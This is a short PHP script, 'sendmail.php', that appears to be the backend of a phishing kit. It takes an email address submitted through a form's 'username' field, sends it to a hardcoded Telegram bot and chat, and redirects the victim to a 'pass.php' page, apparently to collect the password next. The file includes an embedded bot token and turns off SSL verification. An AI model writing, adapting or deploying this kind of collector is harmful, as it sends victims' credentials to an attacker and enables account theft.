<?php
// sendmail.php

// It's good practice to display errors during development
ini_set('display_errors', 1);
error_reporting(E_ALL);

// --- Your Bot Details ---
$bot_token = '8166415338:AAEd3Dpp4f_Yup_qtiIm7y4pw2HDATA_ZuA';
$chat_id = '-4625302890';

// --- Check if the form was submitted ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the email from the form submission
    $email = $_POST['username'] ?? '';

    // --- Validate the email address ---
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // --- Prepare the message for Telegram ---
        $message = "📧 New email submitted: <b>" . htmlspecialchars($email) . "</b>";

        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        
        // Data to be sent to the Telegram API
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML' // Use HTML for bold tags
        ];

        // --- START OF cURL REPLACEMENT ---

        // 1. Initialize a cURL session
        $ch = curl_init();

        // 2. Set the URL and other options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true); // We are sending a POST request
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields)); // The data to post
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response instead of printing it
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional: can help on some servers, but less secure. Try without it first.

        // 3. Execute the request
        $response = curl_exec($ch);

        // 4. Close the cURL session
        curl_close($ch);

        // Optional: You can log the response from Telegram for debugging
        // file_put_contents("telegram_log.txt", $response . "\n", FILE_APPEND);

        // --- END OF cURL REPLACEMENT ---


        // --- Redirect the user after successful submission ---
        header('Location: ../pass.php?email=' . urlencode($email));
        exit;
    }
}

// If the script is accessed directly or the email is invalid, redirect back
header('Location: ../index.php');
exit;
?>
